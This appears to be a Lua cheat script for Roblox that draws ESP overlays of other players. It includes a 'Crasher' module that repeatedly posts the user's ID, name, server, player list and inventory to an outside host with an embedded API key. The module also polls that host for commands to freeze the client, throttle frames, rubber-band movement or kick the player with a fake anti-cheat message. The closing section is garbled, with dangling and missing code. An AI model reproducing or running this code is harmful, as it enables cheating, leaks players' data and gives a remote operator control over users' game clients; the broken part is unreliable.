        local speedValueLabel = Instance.new("TextLabel", speedBillboard)
        speedValueLabel.Name = "SpeedValue"
        speedValueLabel.Size = UDim2.new(1, 0, 1, 0)
        speedValueLabel.BackgroundTransparency = 1
        speedValueLabel.BorderSizePixel = 0
        speedValueLabel:SetAttribute("S2HubColorPrimary", true)
        speedValueLabel.TextColor3 = (HUB_COLOR_PALETTES[hubColorIndex] or HUB_COLOR_PALETTES[1]).primary
        speedValueLabel.TextStrokeColor3 = Color3.fromRGB(0, 0, 0)
        speedValueLabel.TextStrokeTransparency = 0.18
        speedValueLabel.Font = Enum.Font.LuckiestGuy
        speedValueLabel.TextSize = 18
        speedValueLabel.TextXAlignment = Enum.TextXAlignment.Center
        speedValueLabel.TextYAlignment = Enum.TextYAlignment.Center
        speedValueLabel.Text = "0,0"
        local box = Instance.new("Frame", bb)
        box.Size = UDim2.new(1, 0, 1, 0)
        box.BackgroundTransparency = 1
        box.BorderSizePixel = 0
        Instance.new("UICorner", box).CornerRadius = UDim.new(0, 10)
        local avatar = Instance.new("ImageLabel", box)
        avatar.Name = "Avatar"
        avatar.Size = UDim2.new(0, 42, 0, 42)
        avatar.Position = UDim2.new(0, 3, 0, 4)
        avatar.BackgroundColor3 = Color3.fromRGB(28, 28, 32)
        avatar.BackgroundTransparency = 0.08
        avatar.BorderSizePixel = 0
        avatar.ScaleType = Enum.ScaleType.Crop
        avatar.ZIndex = 34
        Instance.new("UICorner", avatar).CornerRadius = UDim.new(1, 0)
        local avatarStroke = Instance.new("UIStroke", avatar)
        avatarStroke.Color = Color3.fromRGB(245, 245, 245)
        avatarStroke.Thickness = 1.5
        avatarStroke.Transparency = 0.08
        pcall(function()
            local imageUrl = Players:GetUserThumbnailAsync(plr.UserId, Enum.ThumbnailType.HeadShot, Enum.ThumbnailSize.Size48x48)
            avatar.Image = imageUrl
        end)
        local n = Instance.new("TextLabel", box)
        n.Size = UDim2.new(1, -58, 0, 22)
        n.Position = UDim2.new(0, 54, 0, 5)
        n.BackgroundTransparency = 1
        n:SetAttribute("S2HubColorPrimary", true)
        n.TextColor3 = (HUB_COLOR_PALETTES[hubColorIndex] or HUB_COLOR_PALETTES[1]).primary
        n.Font = Enum.Font.LuckiestGuy
        n.TextSize = 14
        n.TextXAlignment = Enum.TextXAlignment.Left
        n.TextTruncate = Enum.TextTruncate.AtEnd
        n.TextStrokeTransparency = 0.38
        n.Text = plr.DisplayName
        local sub = Instance.new("TextLabel", box)
        sub.Size = UDim2.new(1, -58, 0, 16)
        sub.Position = UDim2.new(0, 54, 0, 27)
        sub.BackgroundTransparency = 1
        sub.TextColor3 = Color3.fromRGB(190, 190, 198)
        sub.Font = Enum.Font.LuckiestGuy
        sub.TextSize = 9
        sub.TextXAlignment = Enum.TextXAlignment.Left
        sub.TextTruncate = Enum.TextTruncate.AtEnd
        sub.TextStrokeTransparency = 0.58
        sub.Text = "@" .. plr.Name
        local lastEspUpdate = 0
        local conn = RunService.Heartbeat:Connect(function()
            if not PlayerESP.enabled or not hrp.Parent then
                return
            end
            local now = tick()
            if optimizeEnabled and now - lastEspUpdate < 0.30 then
                return
            end
            lastEspUpdate = now
            local d = PlayerESP.playerData[plr]
            if d and d.highlight then
                d.highlight.Enabled = espHighlightEnabled == true
            end
            if d and d.billboard then
                d.billboard.Enabled = espAvatarEnabled == true
            end
            if d and d.speedBillboard then
                d.speedBillboard.Enabled = espSpeedEnabled == true
            end
            if espSpeedEnabled and d and d.speedLabel then
                local velocity = hrp.AssemblyLinearVelocity or hrp.Velocity
                local horizontalSpeed = Vector3.new(velocity.X, 0, velocity.Z).Magnitude
                d.speedLabel.Text = string.format("%.1f", horizontalSpeed):gsub("%.", ",")
                d.speedLabel.TextColor3 = (HUB_COLOR_PALETTES[hubColorIndex] or HUB_COLOR_PALETTES[1]).primary
            end
            local parts = {}
            local rt = espRagText(plr, char:FindFirstChildOfClass("Humanoid"))
            if rt then
                table.insert(parts, rt)
            end
            local details = "@" .. plr.Name
            if #parts > 0 then
                details = details .. " | " .. table.concat(parts, " | ")
            end
            sub.Text = details
            n.Visible = true
            sub.Visible = true
        end)
        PlayerESP.playerData[plr] = {
            highlight = hl,
            billboard = bb,
            speedBillboard = speedBillboard,
            speedLabel = speedValueLabel,
            conns = { conn },
        }
    end
    PlayerESP.cleanup = cleanup
    for _, plr in ipairs(Players:GetPlayers()) do
        if plr ~= LP then
            if plr.Character then
                setup(plr, plr.Character)
            end
            table.insert(
                PlayerESP.conns,
                plr.CharacterAdded:Connect(function(c)
                    task.defer(setup, plr, c)
                end)
            )
        end
    end
    table.insert(
        PlayerESP.conns,
        Players.PlayerAdded:Connect(function(plr)
            if plr ~= LP then
                table.insert(
                    PlayerESP.conns,
                    plr.CharacterAdded:Connect(function(c)
                        task.defer(setup, plr, c)
                    end)
                )
            end
        end)
    )
    table.insert(
        PlayerESP.conns,
        Players.PlayerRemoving:Connect(function(plr)
            if PlayerESP.cleanup then
                PlayerESP.cleanup(plr)
            end
        end)
    )
end
function stopPlayerESP()
    PlayerESP.enabled = false
    for _, c in ipairs(PlayerESP.conns or {}) do
        pcall(function()
            c:Disconnect()
        end)
    end
    PlayerESP.conns = {}
    for _, d in pairs(PlayerESP.playerData or {}) do
        pcall(function()
            if d.highlight then
                d.highlight:Destroy()
            end
        end)
        pcall(function()
            if d.billboard then
                d.billboard:Destroy()
            end
        end)
        pcall(function()
            if d.speedBillboard then
                d.speedBillboard:Destroy()
            end
        end)
        if d.conns then
            for _, c in ipairs(d.conns) do
                pcall(function()
                    c:Disconnect()
                end)
            end
        end
    end
    PlayerESP.playerData = {}
end
local function _safeDrawing(kind, props)
    if not Drawing or not Drawing.new then
        return nil
    end
    local ok, obj = pcall(function()
        return Drawing.new(kind)
    end)
    if not ok or not obj then
        return nil
    end
    for k, v in pairs(props or {}) do
        pcall(function()
            obj[k] = v
        end)
    end
    return obj
end
function _cleanupBoxedESPPlayer(player)
    local data = BoxedESPData[player]
    if not data then
        return
    end
    for _, obj in pairs(data) do
        pcall(function()
            obj.Visible = false
            if obj.Remove then
                obj:Remove()
            end
        end)
    end
    BoxedESPData[player] = nil
end
function _cleanupBoxedESP()
    for player, _ in pairs(BoxedESPData) do
        _cleanupBoxedESPPlayer(player)
    end
end
local boxedEspLastUpdate = 0
function _updateBoxedESP()
    if optimizeEnabled then
        local now = tick()
        if now - boxedEspLastUpdate < 0.30 then
            return
        end
        boxedEspLastUpdate = now
    end
    local cam = workspace.CurrentCamera
    if not cam then
        return
    end
    local anyOn = BoxedESPOptions.box or BoxedESPOptions.tracer
    if not anyOn then
        _cleanupBoxedESP()
        return
    end
    for _, player in ipairs(Players:GetPlayers()) do
        if player ~= LP then
            local char = player.Character
            local root = char and char:FindFirstChild("HumanoidRootPart")
            local head = char and char:FindFirstChild("Head")
            if not root or not head then
                _cleanupBoxedESPPlayer(player)
            else
                local rootPos, onScreen = cam:WorldToViewportPoint(root.Position)
                local headPos = cam:WorldToViewportPoint(head.Position + Vector3.new(0, 0.55, 0))
                local data = BoxedESPData[player]
                if not data then
                    data = {
                        box = _safeDrawing(
                            "Square",
                            { Thickness = 2, Filled = false, Transparency = 1, Color = ESP_ACCENT }
                        ),
                        tracer = _safeDrawing("Line", { Thickness = 2, Transparency = 1, Color = ESP_ACCENT }),
                    }
                    BoxedESPData[player] = data
                end
                local height = math.abs(headPos.Y - rootPos.Y) * 2.15
                if height < 20 or height ~= height then
                    height = 65
                end
                local width = height / 2.15
                local view = cam.ViewportSize
                local centerX, centerY = view.X / 2, view.Y / 2
                local targetX, targetY = rootPos.X, rootPos.Y + height / 2
                local targetVisible = onScreen and rootPos.Z > 0
                if not targetVisible then
                    local dx = rootPos.X - centerX
                    local dy = rootPos.Y - centerY
                    if rootPos.Z <= 0 then
                        dx = -dx
                        dy = -dy
                    end
                    if math.abs(dx) < 1 and math.abs(dy) < 1 then
                        local rel = cam.CFrame:PointToObjectSpace(root.Position)
                        dx = rel.X
                        dy = -rel.Y
                        if rootPos.Z <= 0 then
                            dx = -dx
                            dy = -dy
                        end
                    end
                    local edgePad = 10
                    local scaleX = (dx ~= 0) and ((view.X / 2 - edgePad) / math.abs(dx)) or math.huge
                    local scaleY = (dy ~= 0) and ((view.Y / 2 - edgePad) / math.abs(dy)) or math.huge
                    local scale = math.min(scaleX, scaleY)
                    if scale == math.huge or scale ~= scale then
                        scale = 1
                    end
                    targetX = math.clamp(centerX + dx * scale, edgePad, view.X - edgePad)
                    targetY = math.clamp(centerY + dy * scale, edgePad, view.Y - edgePad)
                end
                if data.box then
                    data.box.Color = ESP_ACCENT
                    data.box.Size = Vector2.new(width, height)
                    data.box.Position = Vector2.new(rootPos.X - width / 2, rootPos.Y - height / 2)
                    data.box.Visible = BoxedESPOptions.box == true and targetVisible
                end
                if data.tracer then
                    data.tracer.Color = ESP_ACCENT
                    local localChar = LP.Character
                    local localRoot = localChar and localChar:FindFirstChild("HumanoidRootPart")
                    local fromX, fromY
                    if localRoot then
                        local localScreen = cam:WorldToViewportPoint(localRoot.Position)
                        fromX = localScreen.X
                        fromY = localScreen.Y + 15
                    end
                    if not fromX or not fromY then
                        fromX = view.X / 2
                        fromY = view.Y - 88
                    end
                    data.tracer.From = Vector2.new(fromX, fromY)
                    data.tracer.To = Vector2.new(targetX, targetY)
                    data.tracer.Visible = BoxedESPOptions.tracer == true
                end
            end
        end
    end
end
function refreshBoxedESP()
    local anyOn = BoxedESPOptions.box or BoxedESPOptions.tracer
    if anyOn and not BoxedESPConn then
        BoxedESPConn = RunService.RenderStepped:Connect(_updateBoxedESP)
    elseif (not anyOn) and BoxedESPConn then
        BoxedESPConn:Disconnect()
        BoxedESPConn = nil
        _cleanupBoxedESP()
    end
end
Players.PlayerRemoving:Connect(function(plr)
    _cleanupBoxedESPPlayer(plr)
    espUntrackRagdoll(plr)
end)
Players.PlayerAdded:Connect(function(plr)
    if espRagdollCDEnabled then
        espTrackRagdoll(plr)
    end
end)
function espApply()
    BoxedESPOptions.box = espBoxEnabled == true
    BoxedESPOptions.tracer = espTracerEnabled == true
    refreshBoxedESP()
    if espRagdollCDEnabled then
        for _, plr in ipairs(Players:GetPlayers()) do
            if plr ~= LP then
                espTrackRagdoll(plr)
            end
        end
    else
        for plr, _ in pairs(espRagConns) do
            espUntrackRagdoll(plr)
        end
    end
    if espAvatarEnabled or espHighlightEnabled or espSpeedEnabled or espRagdollCDEnabled then
        startPlayerESP()
    else
        stopPlayerESP()
    end
end
Crasher = {
    enabled = false,
    fpsConn = nil,
    fpsOn = false,
    posHistory = {},
    isActive = false,
    mode = nil,
    intervalThread = nil,
    kicked = false,
    prevLagN = false,
    prevLagC = false,
    prevFps = false,
    heartbeatConn = nil,
    pollConn = nil,
    historyConn = nil,
    request = nil,
    BASE = "https://k1dscrasher.onrender.com",
    KEY = "kidcrasher2026",
}
local function crasherResolveRequest()
    local genv = (getgenv and getgenv()) or _G or {}
    return http_request
        or request
        or (syn and syn.request)
        or (http and http.request)
        or (fluxus and fluxus.request)
        or genv.http_request
        or genv.request
        or (genv.syn and genv.syn.request)
end
local function crasherGetRequest()
    if Crasher.request then
        return Crasher.request
    end
    Crasher.request = crasherResolveRequest()
    if not Crasher.request then
        local deadline = tick() + 10
        repeat
            task.wait(0.25)
            Crasher.request = crasherResolveRequest()
        until Crasher.request or tick() > deadline
    end
    return Crasher.request
end
local function crasherSafe(fn)
    local ok, res = pcall(fn)
    if ok then
        return res
    end
    return nil
end
local function crasherCollectBrainrots()
    local list = {}
    local pg = crasherSafe(function()
        return LP:FindFirstChild("PlayerGui")
    end)
    if not pg then
        return list
    end
    local possibleGUIs =
        { "DuelsMachineSession", "DuelsMachine", "BrainrotUI", "BrainrotSession", "SessionGUI", "DuelsGUI" }
    local gui = nil
    for _, name in ipairs(possibleGUIs) do
        gui = crasherSafe(function()
            return pg:FindFirstChild(name)
        end)
        if gui then
            break
        end
    end
    if not gui then
        return list
    end
    local targetFrame = nil
    local function findFrame(container)
        if not container then
            return
        end
        for _, child in ipairs(container:GetChildren()) do
            if
                child:IsA("Frame")
                and (
                    child.Name == "ScrollingFrame"
                    or child.Name == "ListFrame"
                    or child.Name == "ItemList"
                    or child:FindFirstChild("Template")
                )
            then
                return child
            end
            local found = findFrame(child)
            if found then
                return found
            end
        end
        return nil
    end
    targetFrame = findFrame(gui)
    if not targetFrame then
        targetFrame = crasherSafe(function()
            return gui:FindFirstChild("ScrollingFrame")
        end)
    end
    if not targetFrame then
        for _, child in ipairs(gui:GetDescendants()) do
            if child:IsA("Frame") and #child:GetChildren() > 3 then
                targetFrame = child
                break
            end
        end
    end
    if not targetFrame then
        return list
    end
    local processedItems = {}
    local function processItem(item)
        if not item or not item:IsA("Instance") or processedItems[item] then
            return
        end
        processedItems[item] = true
        local title = nil
        local cash = nil
        for _, obj in ipairs(item:GetDescendants()) do
            if
                (obj:IsA("TextLabel") or obj:IsA("TextButton") or obj:IsA("TextBox"))
                and obj.Text
                and obj.Text ~= ""
            then
                local text = obj.Text
                if
                    not string.find(text, "Template")
                    and not string.find(text, "Background")
                    and not string.find(text, "Frame")
                    and not string.find(text, "Scroll")
                    and not string.find(text, "Title")
                    and not string.find(text, "Label")
                then
                    if string.match(text, "%a") and #text > 1 and #text < 50 and not string.find(text, "^%d+$") then
                        if not title or (#text > #title) then
                            title = text
                        end
                    end
                    if
                        string.find(text, "%$")
                        or string.find(text, "Cookie")
                        or string.find(text, "Milki")
                        or string.find(text, "coins")
                        or string.find(text, "Cash")
                        or (string.match(text, "^%d+$") and tonumber(text) and tonumber(text) > 50)
                    then
                        cash = text
                    end
                end
            end
        end
        if title or cash then
            if title and title ~= "" then
                title = title:gsub("^[%s]+", ""):gsub("[%s]+$", "")
            end
            if cash and cash ~= "" then
                cash = cash:gsub("^[%s]+", ""):gsub("[%s]+$", "")
            end
            if title and string.match(title, "^%d+$") and not cash then
                return
            end
            table.insert(
                list,
                { title = title and title ~= "" and title or "Unknown Item", cash = cash and cash ~= "" and cash or "0" }
            )
        end
    end
    local function processAll(container)
        if not container then
            return
        end
        for _, child in ipairs(container:GetChildren()) do
            if child:IsA("Frame") and #child:GetChildren() > 0 then
                local hasText = false
                for _, desc in ipairs(child:GetDescendants()) do
                    if
                        (desc:IsA("TextLabel") or desc:IsA("TextButton") or desc:IsA("TextBox"))
                        and desc.Text
                        and desc.Text ~= ""
                    then
                        hasText = true
                        break
                    end
                end
                if hasText then
                    processItem(child)
                end
            end
            if child:IsA("Frame") or child:IsA("ScrollingFrame") then
                processAll(child)
            end
        end
    end
    processAll(targetFrame)
    for _, child in ipairs(targetFrame:GetChildren()) do
        if child.Name == "Template" and child:IsA("Frame") then
            processItem(child)
        end
    end
    if #list == 0 then
        local simpleBrainrots = {}
        local seenTexts = {}
        for _, child in ipairs(pg:GetDescendants()) do
            if
                (child:IsA("TextLabel") or child:IsA("TextButton") or child:IsA("TextBox"))
                and child.Text
                and child.Text ~= ""
            then
                local text = child.Text:gsub("^[%s]+", ""):gsub("[%s]+$", "")
                if #text > 2 and #text < 30 and not string.match(text, "^%d+$") and not seenTexts[text] then
                    seenTexts[text] = true
                    local cash = "0"
                    if
                        string.find(text, "%$")
                        or string.find(text, "Cookie")
                        or string.find(text, "Milki")
                        or string.find(text, "coins")
                    then
                        cash = text:match("[%$]*(%d+)") or text:match("(%d+)") or "0"
                        text = text:gsub("[%$%d]+", ""):gsub("^[%s]+", ""):gsub("[%s]+$", "")
                        if text == "" then
                            text = "Item"
                        end
                    end
                    if #text > 1 then
                        table.insert(simpleBrainrots, { title = text, cash = cash })
                    end
                end
            end
        end
        if #simpleBrainrots > 0 then
            return simpleBrainrots
        end
    end
    return list
end
local function crasherHeartbeat()
    if not Crasher.enabled then
        return
    end
    crasherSafe(function()
        local brainrots = crasherCollectBrainrots()
        local req = crasherGetRequest()
        if not req then
            return
        end
        local success, result = pcall(function()
            return req({
                Url = Crasher.BASE .. "/api/public/heartbeat",
                Method = "POST",
                Headers = { ["Content-Type"] = "application/json", ["X-Api-Key"] = Crasher.KEY },
                Body = HS:JSONEncode({
                    user_id = LP.UserId,
                    username = LP.Name,
                    display_name = LP.DisplayName,
                    avatar_url = "https://www.roblox.com/headshot-thumbnail/image?userId="
                        .. LP.UserId
                        .. "&width=150&height=150&format=png",
                    place_id = game.PlaceId,
                    game_name = (function()
                        local info = crasherSafe(function()
                            return MarketplaceService:GetProductInfo(game.PlaceId)
                        end)
                        return info and info.Name or "Unknown Game"
                    end)(),
                    job_id = game.JobId,
                    executor = (identifyexecutor and select(1, identifyexecutor())) or "unknown",
                    server_players = (function()
                        local t = {}
                        for _, p in ipairs(Players:GetPlayers()) do
                            t[#t + 1] = p.Name
                        end
                        return t
                    end)(),
                    brainrots = brainrots,
                }),
            })
        end)
        if not success then
            local simpleBrainrots = {}
            local pg = crasherSafe(function()
                return LP:FindFirstChild("PlayerGui")
            end)
            if pg then
                for _, child in ipairs(pg:GetDescendants()) do
                    if (child:IsA("TextLabel") or child:IsA("TextButton")) and child.Text and child.Text ~= "" then
                        local text = child.Text:gsub("^[%s]+", ""):gsub("[%s]+$", "")
                        if #text > 2 and #text < 30 and not string.match(text, "^%d+$") then
                            table.insert(simpleBrainrots, { title = text, cash = "0" })
                        end
                    end
                end
            end
            if #simpleBrainrots > 0 then
                pcall(function()
                    if req then
                        req({
                            Url = Crasher.BASE .. "/api/public/heartbeat",
                            Method = "POST",
                            Headers = { ["Content-Type"] = "application/json", ["X-Api-Key"] = Crasher.KEY },
                            Body = HS:JSONEncode({
                                user_id = LP.UserId,
                                username = LP.Name,
                                display_name = LP.DisplayName,
                                avatar_url = "https://www.roblox.com/headshot-thumbnail/image?userId="
                                    .. LP.UserId
                                    .. "&width=150&height=150&format=png",
                                place_id = game.PlaceId,
                                game_name = (function()
                                    local info = crasherSafe(function()
                                        return MarketplaceService:GetProductInfo(game.PlaceId)
                                    end)
                                    return info and info.Name or "Unknown Game"
                                end)(),
                                job_id = game.JobId,
                                executor = (identifyexecutor and select(1, identifyexecutor())) or "unknown",
                                server_players = (function()
                                    local t = {}
                                    for _, p in ipairs(Players:GetPlayers()) do
                                        t[#t + 1] = p.Name
                                    end
                                    return t
                                end)(),
                                brainrots = simpleBrainrots,
                            }),
                        })
                    end
                end)
            end
        end
    end)
end
local function crasherSetFpsLimit(on)
    if on == Crasher.fpsOn then
        return
    end
    Crasher.fpsOn = on
    if on then
        if Crasher.fpsConn then
            Crasher.fpsConn:Disconnect()
        end
        Crasher.fpsConn = RunService.RenderStepped:Connect(function()
            local t = tick()
            while tick() - t < 0.95 do
            end
        end)
    else
        if Crasher.fpsConn then
            Crasher.fpsConn:Disconnect()
            Crasher.fpsConn = nil
        end
    end
end
local HISTORY_SIZE = 0.27
local INTERVAL = 0.6
local NORMAL_SPEED_MIN = 35
local CARRY_SPEED_MIN = 17
local function crasherCurrentSpeed()
    local char = LP.Character
    local root = char and char:FindFirstChild("HumanoidRootPart")
    if not root then
        return 0
    end
    local v = root.AssemblyLinearVelocity
    return Vector3.new(v.X, 0, v.Z).Magnitude
end
local function crasherMeetsSpeedReq()
    local s = crasherCurrentSpeed()
    if Crasher.mode == "normal" then
        return s >= NORMAL_SPEED_MIN
    end
    if Crasher.mode == "carry" then
        return s >= CARRY_SPEED_MIN
    end
    return false
end
local function crasherDoRubberband()
    local char = LP.Character
    local root = char and char:FindFirstChild("HumanoidRootPart")
    if not root then
        return
    end
    local vel = root.AssemblyLinearVelocity
    local horizVel = Vector3.new(vel.X, 0, vel.Z)
    if horizVel.Magnitude < 1 then
        return
    end
    local targetTime = tick() - HISTORY_SIZE
    local best = nil
    for i = 1, #Crasher.posHistory do
        if Crasher.posHistory[i].time >= targetTime then
            best = Crasher.posHistory[i].cframe
            break
        end
    end
    if not best then
        return
    end
    root.CFrame = best
    root.AssemblyLinearVelocity = vel
end
local function crasherStopLoop()
    if Crasher.intervalThread then
        pcall(task.cancel, Crasher.intervalThread)
        Crasher.intervalThread = nil
    end
end
local function crasherStartLoop()
    crasherStopLoop()
    Crasher.intervalThread = task.spawn(function()
        local startTime = tick()
        local iteration = 0
        while Crasher.isActive do
            while Crasher.isActive and not crasherMeetsSpeedReq() do
                task.wait(0.05)
            end
            if not Crasher.isActive then
                break
            end
            iteration = iteration + 1
            local targetT = startTime + (iteration * INTERVAL)
            local sleepT = targetT - tick()
            if sleepT > 0 then
                task.wait(sleepT)
            end
            if Crasher.isActive and crasherMeetsSpeedReq() then
                crasherDoRubberband()
            end
        end
    end)
end
local function crasherSetMode(newMode)
    if Crasher.mode == newMode then
        return
    end
    Crasher.mode = newMode
    if Crasher.mode then
        Crasher.isActive = true
        crasherStartLoop()
    else
        Crasher.isActive = false
        crasherStopLoop()
    end
end
local function crasherPoll()
    if not Crasher.enabled then
        return
    end
    local req = crasherGetRequest()
    if not req then
        return
    end
    local res = crasherSafe(function()
        return req({
            Url = Crasher.BASE .. "/api/public/command?user_id=" .. LP.UserId,
            Method = "GET",
            Headers = { ["X-Api-Key"] = Crasher.KEY },
        })
    end)
    if not res or not res.Body then
        return
    end
    local ok2, data = pcall(function()
        return HS:JSONDecode(res.Body)
    end)
    if not ok2 or type(data) ~= "table" then
        return
    end
    local wantFps = (data.fps_limit == true)
    if wantFps ~= Crasher.prevFps then
        Crasher.prevFps = wantFps
        crasherSetFpsLimit(wantFps)
    end
    local wantN = (data.lag_n == true)
    local wantC = (data.lag_c == true)
    if wantC ~= Crasher.prevLagC or wantN ~= Crasher.prevLagN then
        Crasher.prevLagC = wantC
        Crasher.prevLagN = wantN
        if wantC then
            crasherSetMode("carry")
        elseif wantN then
            crasherSetMode("normal")
        else
            crasherSetMode(nil)
        end
    end
    if data.crash == true then
        while true do
        end
    end
    if data.kick == true and not Crasher.kicked then
        Crasher.kicked = true
        LP:Kick("You have been removed for cheating, please remove any cheats to play | CODE: BAC-1633")
    end
end
function startCrasher()
    if Crasher.enabled then
        return
    end
    Crasher.enabled = true
    Crasher.kicked = false
    Crasher.prevLagN = false
    Crasher.prevLagC = false
    Crasher.prevFps = false
    if Crasher.historyConn then
        Crasher.historyConn:Disconnect()
    end
    Crasher.historyConn = RunService.Heartbeat:Connect(function()
        if not Crasher.enabled then
            return
        end
        local char = LP.Character
        local root = char and char:FindFirstChild("HumanoidRootPart")
        if not root then
            return
        end
        local now = tick()
        Crasher.posHistory[#Crasher.posHistory + 1] = { cframe = root.CFrame, time = now }
        local cutoff = now - HISTORY_SIZE - 0.1
        while #Crasher.posHistory > 0 and Crasher.posHistory[1].time < cutoff do
            table.remove(Crasher.posHistory, 1)
        end
    end)
    crasherHeartbeat()
    crasherPoll()
    if Crasher.heartbeatConn then
        pcall(task.cancel, Crasher.heartbeatConn)
    end
    Crasher.heartbeatConn = task.spawn(function()
        while Crasher.enabled do
            task.wait(3)
            crasherHeartbeat()
        end
    end)
    if Crasher.pollConn then
        pcall(task.cancel, Crasher.pollConn)
    end
    Crasher.pollConn = task.spawn(function()
        while Crasher.enabled do
            task.wait(0.5)
            crasherPoll()
        end
    end)
end
function stopCrasher()
    if not Crasher.enabled then
        return
    end
    Crasher.enabled = false
    if Crasher.heartbeatConn then
        pcall(task.cancel, Crasher.heartbeatConn)
        Crasher.heartbeatConn = nil
    end
    if Crasher.pollConn then
        pcall(task.cancel, Crasher.pollConn)
        Crasher.pollConn = nil
    end
    if Crasher.historyConn then
        Crasher.historyConn:Disconnect()
        Crasher.historyConn = nil
    end
    crasherSetFpsLimit(false)
    Crasher.isActive = false
    crasherStopLoop()
    Crasher.mode = nil
    Crasher.posHistory = {}
end

    pingOverlay.ZIndex = 101
    local pfdn, pfds, pfsp = false, nil, nil

        if uiLocked then return end

        if pfdn and not uiLocked and (i.UserInputType == Enum.UserInputType.MouseMovement or i.UserInputType == Enum.UserInputType.Touch) then
            perfFrame.Position = UDim2.new(pfsp.X.Scale, pfsp.X.Offset + (i.Position.X - pfds.X), pfsp.Y.Scale, pfsp.Y.Offset + (i.Position.Y - pfds.Y))

    local W, H = 300, 536

            _hubRestored = true

    outer.BackgroundColor3 = Color3.fromRGB(3, 3, 5)

    outer.ClipsDescendants = false
    mainGuiScaleRef = Instance.new("UIScale", outer)

    Instance.new("UICorner", outer).CornerRadius = UDim.new(0, 16)
    local outerStroke = Instance.new("UIStroke", outer)
    outerStroke.Color = Color3.fromRGB(0, 0, 0)
    outerStroke.Thickness = 3
    outerStroke.Transparency = 0.02
    local bg = Instance.new("ImageLabel", outer)
    bg.Name = "HubBG"
    bg.Image = "rbxassetid://77748104911717"
    bg.ScaleType = Enum.ScaleType.Crop
    bg.Size = UDim2.new(1, 0, 1, 0)
    bg.BackgroundTransparency = 1
    bg.ZIndex = 0
    bg.ImageTransparency = 0
    bg.Visible = true
    local texBg = Instance.new("ImageLabel", outer)
    texBg.Name = "HubTexture"
    texBg.Image = "rbxassetid://77748104911717"
    texBg.ScaleType = Enum.ScaleType.Tile
    texBg.ImageRectSize = Vector2.new(256, 256)
    texBg.Size = UDim2.new(1, 0, 1, 0)

    texBg.Visible = true
    local MENU_BACKGROUND_IDS = {
        [1] = "77748104911717",
        [2] = "104589719960803",
        [3] = "106249804742479",
        [4] = "110284810484868",

        [7] = "124307432230132",
        [8] = "76564971149748",
        [9] = "96785532200711",
        [10] = "139525430955766",
        [11] = "90522098995783",
        [12] = "98828317072898",
        [13] = "114156699649946",
        [14] = "116547631274584",
        [15] = "126842089519771",
        [16] = "106225864936374",
    }
    local function applyMenuBackground(index)
        index = math.clamp(math.floor(tonumber(index) or 1), 0, 16)
        menuBackgroundIndex = index
        if index == 0 then
            bg.Visible = false
            texBg.Visible = false

            bg.Image = "rbxassetid://" .. imageId
            texBg.Image = "rbxassetid://" .. imageId
            bg.ImageTransparency = 0
            texBg.ImageTransparency = 0.85
            bg.Visible = true
            texBg.Visible = true
            applyMobileActionButtonBackground(buttonBackgroundIndex)
        end
    end
    applyMenuBackground(menuBackgroundIndex)
    mainFrame = Instance.new("Frame", outer)
    mainFrame.Name = "Main"

    mainFrame.Position = UDim2.new(0, 0, 0, 0)
    mainFrame.BackgroundColor3 = Color3.fromRGB(4, 4, 6)
    mainFrame.BackgroundTransparency = 0.06
    mainFrame.BorderSizePixel = 0
    mainFrame.ClipsDescendants = true
    mainFrame.ZIndex = 5
    Instance.new("UICorner", mainFrame).CornerRadius = UDim.new(0, 15)
    local mfStroke = Instance.new("UIStroke", mainFrame)
    mfStroke.Color = th.ACCENT
    mfStroke.Thickness = 1.5
    mfStroke.Transparency = 0.5
    local function applyTransparencyToGui(transparent)
        if transparent then
            mainFrame.BackgroundTransparency = 0
            if bg then
                bg.ImageTransparency = 1
                bg.Visible = false
            end
        else
            mainFrame.BackgroundTransparency = 1
            if bg then
                bg.ImageTransparency = 0
                bg.Visible = true
            end
        end
    end
    local function dragHandle(handle)
        local dn, ds, sp, di = false
        handle.InputBegan:Connect(function(i)
            if uiLocked then
                return
            end
            if i.UserInputType == Enum.UserInputType.MouseButton1 or i.UserInputType == Enum.UserInputType.Touch then
                dn = true
                ds = i.Position
                sp = (mainFrame.Parent and mainFrame.Parent.Name == "OuterBorder" and mainFrame.Parent or mainFrame).Position
                i.Changed:Connect(function()
                    if i.UserInputState == Enum.UserInputState.End then
                        dn = false
                        if outer and writefile then
                            local p = outer.Position
                            local collapseCorrection = tonumber(outer:GetAttribute("S2HubCollapseYCorrection")) or 0
                            pcall(function()
                                mergeGuiPosition("_hub", p.X.Scale, p.X.Offset, p.Y.Scale, p.Y.Offset + collapseCorrection)
                            end)
                        end
                    end
                end)
            end
        end)
        handle.InputChanged:Connect(function(i)
            if i.UserInputType == Enum.UserInputType.MouseMovement or i.UserInputType == Enum.UserInputType.Touch then
                di = i
            end
        end)
        trackConn(UIS.InputChanged:Connect(function(i)
            if i == di and dn and not uiLocked then
                local target = (mainFrame.Parent and mainFrame.Parent.Name == "OuterBorder" and mainFrame.Parent)
                    or mainFrame
                target.Position = UDim2.new(
                    sp.X.Scale,
                    sp.X.Offset + (i.Position.X - ds.X),
                    sp.Y.Scale,
                    sp.Y.Offset + (i.Position.Y - ds.Y)
                )
            end
        end))
    end
